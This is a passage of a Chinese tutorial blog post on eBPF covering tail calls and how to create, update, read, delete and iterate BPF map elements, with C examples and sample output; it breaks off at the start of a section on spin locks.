id="BPF尾调用"><a href="#BPF尾调用" class="headerlink" title="BPF尾调用"></a>BPF尾调用</h3><p>BPF程序可以通过尾调用调用其他BPF程序。 这是一个强大的功能，因为它允许你通过组合更小的BPF函数来组装更复杂的程序。<code>5.2</code>之前的内核版本对BPF程序可以生成的机器指令的数量有硬性限制。此限制设置为4096，以确保程序可以在合理的时间内终止。然而，随着人们构建更复杂的BPF程序，他们需要一种方法来扩展内核强加的指令限制，这就是尾调用发挥作用的地方。从内核版本<code>5.2</code>开始，指令限制增加到一百万条指令。尾调用嵌套也受到限制，在本例中为32个调用，这意味着你可以在一个链中组合多达32个程序来为遇到的问题提供解决方案。</p><p>当你从另一个BPF程序调用一个BPF程序时，内核会完全重置程序上下文。记住这一点很重要，因为你可能需要一种在程序之间共享信息的方法。每个BPF程序作为其参数接收的上下文对象不会帮助我们解决这个数据共享问题。 在下一章中，我们将讨论<code>BPF map</code>作为在程序之间共享信息的一种方式。我们还会展示如何使用尾调用从一个BPF程序跳转到另一个的示例。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://vinin.me/2022/04/10/Hello-eBPF/" target="_blank" rel="noopener">http://vinin.me/2022/04/10/Hello-eBPF/</a></li><li><a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/</a></li><li><p><a href="https://elixir.bootlin.com/linux/v5.5.19/source/samples/bpf" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.5.19/source/samples/bpf</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/1472857" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1472857</a></p></li><li><a href="https://blog.csdn.net/Xiongzhizhu/article/details/51816243" target="_blank" rel="noopener">https://blog.csdn.net/Xiongzhizhu/article/details/51816243</a></li><li><a href="https://blog.csdn.net/weixin_43847470/article/details/122145676" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43847470/article/details/122145676</a></li></ul><h2 id="第三章节"><a href="#第三章节" class="headerlink" title="第三章节"></a>第三章节</h2><h3 id="BPF映射"><a href="#BPF映射" class="headerlink" title="BPF映射"></a>BPF映射</h3><p>在程序中调用行为的消息传递是软件工程中广泛使用的技术。 一个程序可以通过发送消息来修改另一个程序的行为，这也允许在这些程序之间交换信息。 BPF最令人痴迷的一方面是，内核代码和被加载的代码可以在运行时使用消息传递相互通信。</p><p>在本章中，我们将介绍BPF程序和用户空间程序如何相互通信。我们描述了内核和用户空间之间的不同通信管道，以及它们如何存储信息。 我们还向你展示了这些管道的用例，以及如何使这些管道中的数据在程序初始化之间进行持久化。</p><p>BPF映射是驻留在内核中的<code>key/value</code>存储。 任何知道它们的BPF程序都可以访问它们。在用户空间中运行的程序也可以通过使用文件描述符来访问这些映射。只要事先正确指定数据大小，就可以在<code>map</code>中存储任何类型的数据。 内核将键和值视为二进制类型的大对象(blob)，它不关心你在<code>map</code>中保留的内容。BPF 验证器包含多种保护措施，以确保你所创建和访问<code>map</code>的方式是安全的。 </p><h4 id="创建BPF映射"><a href="#创建BPF映射" class="headerlink" title="创建BPF映射"></a>创建BPF映射</h4><p>创建BPF映射最直接的方法是使用bpf系统调用。当调用的第一个参数是<code>BPF_MAP_CREATE</code>时，是在告诉内核你想要创建一个新的映射。此调用将返回与你刚创建的<code>BPF Maps</code>关联的文件描述符标识符。系统调用中的第二个参数是此映射的配置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    __u32 map_type;<span class="comment">/* one of the values from bpf_map_type */</span></span><br><span class="line">    __u32 key_size;<span class="comment">/* size of the keys, in bytes */</span></span><br><span class="line">    __u32 value_size;<span class="comment">/* size of the values, in bytes */</span></span><br><span class="line">    __u32 max_entries;<span class="comment">/* maximum number of entries in the map */</span></span><br><span class="line">    __u32 map_flags;<span class="comment">/* flags to modify how we create the map */</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>系统调用中的第三个参数是此配置属性的大小。例如，你可以创建一个<code>hash map</code>来存储无符号整数作为键和值，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr my_map &#123; </span><br><span class="line">  .map_type = BPF_MAP_TYPE_HASH, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">.map_flags = BPF_F_NO_PREALLOC,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> fd = bpf(BPF_MAP_CREATE, &amp;my_map, <span class="keyword">sizeof</span>(my_map));</span><br></pre></td></tr></table></figure><p>如果调用失败，内核将返回值-1。 失败的原因可能有三个。如果其中一个属性无效，内核将<code>errno</code>变量设置为<code>EINVAL</code>。 如果执行操作的用户没有足够的权限，内核会将<code>errno</code>变量设置为<code>EPERM</code>。 最后，如果没有足够的内存来存储映射，内核将<code>errno</code>变量设置为<code>ENOMEM</code>。</p><h4 id="创建BPF映射的ELF约定"><a href="#创建BPF映射的ELF约定" class="headerlink" title="创建BPF映射的ELF约定"></a>创建BPF映射的ELF约定</h4><p>内核包含一些约定和助手来生成和使用<code>BPF maps</code>。 你可能会发现这些约定比直接执行系统调用更频繁地出现，因为它们更具可读性且更容易遵循。请记住，这些约定仍然使用bpf系统调用来创建<code>map</code>，即使直接在内核中运行也是如此，如果不知道事先需要哪种<code>map</code>，你会发现直接使用系统调用更有用。</p><p>helper函数<code>bpf_map_create</code>包装了刚才看到的代码，以便更容易根据需要初始化<code>map</code>。我们可以使用它创建先前定义的<code>map</code>，只需一行代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = bpf_create_map(BPF_MAP_TYPE_HASH, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">100</span>,</span><br><span class="line">        BPF_F_NO_PREALOC);</span><br></pre></td></tr></table></figure><p>如果你知道你的程序需要哪种<code>map</code>，你也可以预先定义它。这有助于在程序预先使用的<code>map</code>中获得更高的可见性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> my_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_HASH, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">.map_flags =BPF_F_NO_PREALLOC, </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当您以这种方式定义<code>map</code>时，您使用的是所谓的<code>section</code>属性，在本例中为<code>SEC(&quot;maps&quot;)</code>。 这个宏告诉内核这个结构是一个BPF映射，它应该被相应地创建。你可能已经注意到，在这个新示例中，我们没有与<code>map</code>关联的文件描述符标识符。 在这种情况下，内核使用一个名为<code>map_data</code>的全局变量来存储有关程序中<code>map</code>的信息。 这个变量是一个结构数组，它按照你在代码中指定每个映射的方式排序。例如，如果前一个<code>map</code>是你的代码中指定的第一个<code>map</code>，你将从数组中的第一个元素获取文件描述符标识符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd = map_data[<span class="number">0</span>].fd;</span><br></pre></td></tr></table></figure><p>你还可以从此结构中访问<code>map</code>的名称及其定义， 此信息有时可用于调试和跟踪目的。初始化<code>map</code>后，你可以开始使用它们在内核和用户空间之间发送消息。 现在让我们看看如何使用这些<code>map</code>所存储的数据进行工作。</p><h3 id="与BPF映射工作"><a href="#与BPF映射工作" class="headerlink" title="与BPF映射工作"></a>与BPF映射工作</h3><p>内核和用户空间之间的通信将成为你编写的每个BPF程序的基础部分。 为内核编写代码时访问映射的<code>API</code>与为用户空间程序编写代码时不同。 本节介绍每个实现的语义和具体细节。</p><h4 id="更新BPF映射中的元素"><a href="#更新BPF映射中的元素" class="headerlink" title="更新BPF映射中的元素"></a>更新BPF映射中的元素</h4><p>创建任何<code>map</code>后，你可能希望用信息填充它。为此，内核助手提供了函数<code>bpf_map_update_elem</code>。 如果你在内核运行的程序中从<code>bpf/bpf_helpers.h</code>加载这个函数，与在用户空间运行的程序中从<code>tools/lib/bpf/bpf.h</code>加载它，这个函数的签名是不同的。这是因为在内核中工作时可以直接访问<code>map</code>，但在用户空间中工作时需要使用文件描述符引用它们。行为也略有不同，内核上运行的代码可以直接访问内存中的<code>map</code>，并且可以就地原子地更新元素。但是，在用户空间中运行的代码必须将消息发送到内核，内核会在更新<code>map</code>之前复制提供的值，这使得更新操作不是原子的。此函数在操作成功时返回0，在操作失败时返回负数。 在失败的情况下，全局变量<code>errno</code>将填充失败原因。 我们将在本章后面列出更多上下文的失败案例。</p><p>内核中的<code>bpf_map_update_elem</code>函数有四个参数。第一个是指向我们已经定义的<code>map</code>的指针。 第二个是指向我们要更新的键的指针。 因为内核不知道我们要更新的键的类型，所以这个方法被定义为一个指向<code>void</code>的不透明指针，这意味着我们可以传递任何数据。第三个参数是我们要插入的值。 此参数使用与<code>key</code>参数相同的语义。 在本书中，我们展示了一些如何利用不透明指针的高级示例。 你可以使用此函数中的第四个参数来更改<code>map</code>的更新方式。这个参数可以取三个值：</p><ul><li>如果你传递0，你告诉内核你想要更新元素如果它存在或不存在它都应该在映射中创建元素。</li><li>如果你传递1，你告诉内核只在元素不存在时创建它。</li><li>如果你传递2，内核只会在元素存在时更新它。</li></ul><p>这些值被定义为你可以使用的常量，而不必记住整数语义。值为<code>BPF_ANY</code>表示0，<code>BPF_NOEXIST</code>表示1，<code>BPF_EXIST</code>表示2。</p><p>让我们使用在上一节中定义的映射来编写一些示例。 在我们的第一个示例中，我们向<code>map</code>添加了一个新值。 因为<code>map</code>是空的，我们可以假设任何更新行为都是正常的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result;</span><br><span class="line">key = <span class="number">1</span>, value = <span class="number">1234</span>;</span><br><span class="line">result = bpf_map_update_elem(&amp;my_map, &amp;key, &amp;value, BPF_ANY); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>在这个例子中，我们使用<code>strerror</code>来描述<code>errno</code>变量中的错误集。 你可以使用<code>man strerror</code>在手册页上了解有关此功能的更多信息。现在让我们看看当我们尝试创建具有相同键的元素时会得到什么结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; </span><br><span class="line">key = <span class="number">1</span>, value = <span class="number">5678</span>;</span><br><span class="line">result = bpf_map_update_elem(&amp;my_map, &amp;key, &amp;value, BPF_NOEXIST); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>因为我们已经在<code>map</code>中创建了一个键为1的元素，调用<code>bpf_map_update_elem</code>的结果将为-1，<code>errno</code>值为<code>EEXIST</code>。 该程序将在屏幕上打印以下内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to update <span class="built_in">map</span> with <span class="keyword">new</span> value: <span class="number">-1</span> (File exists)</span><br></pre></td></tr></table></figure><p>同样，让我们更改此程序以尝试更新一个不存在的元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; </span><br><span class="line">key = <span class="number">1234</span>, value = <span class="number">5678</span>;</span><br><span class="line">result = bpf_map_update_elem(&amp;my_map, &amp;key, &amp;value, BPF_EXIST); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>使用标志<code>BPF_EXIST</code>，此操作的结果将再次为-1。 内核会将<code>errno</code>变量设置为<code>ENOENT</code>，程序将打印以下内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to update <span class="built_in">map</span> with <span class="keyword">new</span> value: <span class="number">-1</span> (No such file <span class="keyword">or</span> directory)</span><br></pre></td></tr></table></figure><p>这些示例展示了如何从内核程序中更新映射。 你还可以从用户空间程序中更新映射。 执行此操作的助手与我们刚刚看到的类似， 唯一的区别是它们使用文件描述符来访问映射，而不是直接使用指向映射的指针。我们知道，用户空间程序总是使用文件描述符访问映射。 因此，在我们的示例中，我们将参数<code>my_map</code>替换为全局文件描述符标识符<code>map_data[0].fd</code>。 在这种情况下，原始代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; </span><br><span class="line">key = <span class="number">1</span>, value = <span class="number">1234</span>;</span><br><span class="line">result = bpf_map_update_elem(map_data[<span class="number">0</span>].fd, &amp;key, &amp;value, BPF_ANY); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><h4 id="读取BPF映射中的元素"><a href="#读取BPF映射中的元素" class="headerlink" title="读取BPF映射中的元素"></a>读取BPF映射中的元素</h4><p>BPF还提供了两个不同的帮助器来根据你的代码运行的位置从映射中读取。 这两个助手都称为 <code>bpf_map_lookup_elem</code>。 和更新助手一样，它们的第一个参数不同， 内核方法采用对映射的引用，而用户空间助手采用映射的文件描述符标识符作为其第一个参数。两种方法都返回一个整数来表示操作是失败还是成功，就像更新助手一样。 这些帮助器中的第三个参数是指向代码中变量的指针，该变量将存储从映射中读取的值。 我们根据上一节中看到的代码提供两个示例。</p><p>第一个示例是BPF程序在内核上运行时读取插入到映射中的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; <span class="comment">// value is going to store the expected element's value </span></span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_lookup_elem(&amp;my_map, &amp;key, &amp;value); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>如果我们试图读取的键<code>bpf_map_lookup_elem</code>返回一个负数，它将<code>errno</code>变量中设置错误。 例如，如果我们在尝试读取并没有插入的值，内核将返回“未找到”错误<code>ENOENT</code>。</p><p>第二个示例与刚刚看到的示例类似，但这次我们从运行在用户空间的程序中读取映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; <span class="comment">// value is going to store the expected element's value </span></span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_lookup_elem(map_data[<span class="number">0</span>].fd, &amp;key, &amp;value); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>这就是我们能够访问BPF映射中的信息所需的全部内容。 我们将在后面的章节中研究不同的工具包是如何简化这一点的，以使访问数据变得更加简单。 接下来我们来谈谈从映射中删除数据。</p><h4 id="删除BPF映射中的元素"><a href="#删除BPF映射中的元素" class="headerlink" title="删除BPF映射中的元素"></a>删除BPF映射中的元素</h4><p>我们可以在<code>map</code>上执行的第三个操作是删除元素。 与写入和读取元素一样，BPF为我们提供了两个不同的帮助器来删除元素，都称为<code>bpf_map_delete_element</code>。和前面的例子一样，当你在内核上运行的程序中使用这些助手时，它们使用对映射的直接引用，当你在运行用户空间的程序中使用它们时，它们使用映射的文件描述符标识。</p><p>第一个示例是BPF程序在内核上运行时删除了插入到映射中的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, result; </span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_delete_element(&amp;my_map, &amp;key); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Element deleted from the map\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to delete element from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>如果你尝试删除的元素不存在，内核将返回一个负数。 在这种情况下，它还会使用“未找到”错误<code>ENOENT</code>填充<code>errno</code>变量。</p><p>第二个示例是当BPF程序运行在用户空间时删除元素`</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, result; </span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_delete_element(map_data[<span class="number">0</span>].fd, &amp;key); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Element deleted from the map\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to delete element from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><h4 id="迭代BPF映射中的元素"><a href="#迭代BPF映射中的元素" class="headerlink" title="迭代BPF映射中的元素"></a>迭代BPF映射中的元素</h4><p>我们在本节中看到的最后一个操作可以帮助你在BPF程序中找到任意元素。 有时你不知道要查找的元素的确切键，或者只想查看<code>map</code>中的内容。BPF为此提供了一个名为<code>bpf_map_get_next_key</code>的指令。 此指令仅适用于在用户空间运行的程序。</p><p>这个帮助器为你提供了一种确定的方式来迭代<code>map</code>上的元素，但它不如大多数编程语言中的迭代器那么直观。 它需要三个参数。第一个是<code>map</code>的文件描述符标识符，第二个参数<code>key</code>是要查找的标识符，第三个参数<code>next_key</code>是映射中的下一个键。我们更喜欢将第一个参数称为<code>lookup_key</code>。 当你调用这个帮助器时，BPF会尝试在这个<code>map</code>中使用作为查找键传递的键来查找元素， 然后，它将<code>next_key</code>参数设置为映射中的相邻键。 所以如果你想知道<code>key 1</code>之后是哪个<code>key</code>，你需要设置1作为你的查找<code>key</code>，如果<code>map</code>有一个与这个<code>key</code>相邻的<code>key</code>，BPF会将它设置为<code>next_key</code>参数的值。</p><p>在查看<code>bpf_map_get_next_key</code>的工作原理之前，让我们在<code>map</code>中多添加一些元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> new_key, new_value, it; </span><br><span class="line"><span class="keyword">for</span>(it=<span class="number">2</span>;it&lt;<span class="number">6</span>;it++)&#123;</span><br><span class="line">  new_key = it;</span><br><span class="line">     new_value = <span class="number">1234</span> + it;</span><br><span class="line">     bpf_map_update_elem(map_data[<span class="number">0</span>].fd, &amp;new_key, &amp;new_value, BPF_NOEXIST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果要打印映射中的所有值，可以将<code>bpf_map_get_next_key</code>与映射中不存在的查找键一起使用。 这会强制BPF从<code>map</code>的开头开始：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> next_key, lookup_key; </span><br><span class="line">lookup_key = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(bpf_map_get_next_key(map_data[<span class="number">0</span>].fd, &amp;lookup_key, &amp;next_key) == <span class="number">0</span>) &#123; </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The next key in the map is: '%d'\n"</span>, next_key);</span><br><span class="line">lookup_key = next_key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The next key in the map is: '1'</span><br><span class="line">The next key in the map is: '2'</span><br><span class="line">The next key in the map is: '3'</span><br><span class="line">The next key in the map is: '4'</span><br><span class="line">The next key in the map is: '5'</span><br></pre></td></tr></table></figure><p>你可以看到在循环结束时将下一个键分配给<code>lookup_key</code>， 这样，我们继续遍历<code>map</code>，直到终点。 当<code>bpf_map_get_next_key</code>到达<code>map</code>末尾时，返回值为负数，<code>errno</code>变量设置为<code>ENOENT</code>。 这将中止循环执行。</p><p><code>bpf_map_get_next_key</code>可以查找从<code>map</code>中任意点开始的键，如果你只想要另一个特定键的下一个键，则不需要从<code>map</code>的开头开始。</p><p>许多编程语言在遍历其元素之前会复制映射中的值。 如果你的程序中的某些其他代码试图改变<code>map</code>，这样可以防止一些未知行为。如果该代码从<code>map</code>中删除元素，这将会是一个危险的操作。BPF在使用<code>bpf_map_get_next_key</code>循环之前不会复制映射中的值。如果程序的另一部分在循环遍历值时从<code>map</code>中删除了一个元素，则<code>bpf_map_get_next_key</code>将重新开始进行遍历。 让我们看一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> next_key, lookup_key; </span><br><span class="line">lookup_key = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(bpf_map_get_next_key(map_data[<span class="number">0</span>].fd, &amp;lookup_key, &amp;next_key) == <span class="number">0</span>) &#123; </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The next key in the map is: '%d'\n"</span>, next_key);</span><br><span class="line"><span class="keyword">if</span> (next_key == <span class="number">2</span>) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Deleting key '2'\n"</span>);</span><br><span class="line">    bpf_map_delete_element(map_data[<span class="number">0</span>].fd &amp;next_key);</span><br><span class="line">&#125;</span><br><span class="line">    lookup_key = next_key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该程序的打印输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">The next key in the map is: '1'</span><br><span class="line">The next key in the map is: '2'</span><br><span class="line">Deleteing key '2'</span><br><span class="line">The next key in the map is: '1'</span><br><span class="line">The next key in the map is: '3'</span><br><span class="line">The next key in the map is: '4'</span><br><span class="line">The next key in the map is: '5'</span><br></pre></td></tr></table></figure><h4 id="查找和删除元素"><a href="#查找和删除元素" class="headerlink" title="查找和删除元素"></a>查找和删除元素</h4><p>内核公开的另一个用于处理<code>map</code>的函数是<code>bpf_map_lookup_and_delete_elem</code>。此函数在<code>map</code>中搜索给定键并从中删除元素。同时，它把元素的值写入一个变量供程序使用。 当你使用队列和堆栈映射时，此函数会派上用场，而且，它不仅限于与这些类型的映射一起使用。 让我们看一个示例，说明如何将它与我们在之前示例中使用的<code>map</code>一起使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result, it; </span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(it=<span class="number">0</span>;it&lt;<span class="number">2</span>;it++)&#123;</span><br><span class="line">result = bpf_map_lookup_and_delete_element(map_data[<span class="number">0</span>].fd, &amp;key, &amp;value); </span><br><span class="line">  <span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value); </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们尝试从<code>map</code>中获取相同的元素两次。在第一次遍历中，这段代码将打印<code>map</code>中元素的值。 但是，因为我们使用的是<code>bpf_map_lookup_and_delete_element</code>，所以第一次遍历也会从<code>map</code>中删除元素。 循环第二次尝试获取元素时，此代码将失败，并将使用“未找到”错误<code>ENOENT</code>填充<code>errno</code>变量。</p><h4 id="并发访问map元素"><a href="#并发访问map元素" class="headerlink" title="并发访问map元素"></a>并发访问map元素</h4><p>使用<code>BPF map</code>的挑战之一是许多程序可以同时访问相同的<code>map</code>。这可能会在我们的BPF程序中引入竞争条件，并使<code>map</code>中的资源访问变得不可预测。 为了防止竞争条件，BPF引入了BPF自旋锁的概念，它允许你在操作<code>map</code>元素时锁定对它的访问。 自旋锁仅适用于数组、散列和<code>cgroup</code>存储映射。</p><p>有两个BPF辅助函数可用于处理自旋锁：<code>bpf_spin_lock</code>用于锁定一个元素，<code>bpf_spin_unlock</code>可以解锁该元素。这些辅助函数使用信号量的结构来访问包含此信号量的元素。 当信号量被锁定时，其他程序无法访问元素的值，它们会一直等到信号量被解锁。 同时，BPF自旋锁引入了一个新的标志，用户空间程序可以使用它来改变锁的状态。该标志称为<code>BPF_F_LOCK</code>。使用自旋锁我们需要做的第一件事是创建我们想要锁定访问的元素，然后添加我们的信号量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">concurrent_element</span> &#123;</span> </span><br><span class="line">  <span class="class"><span 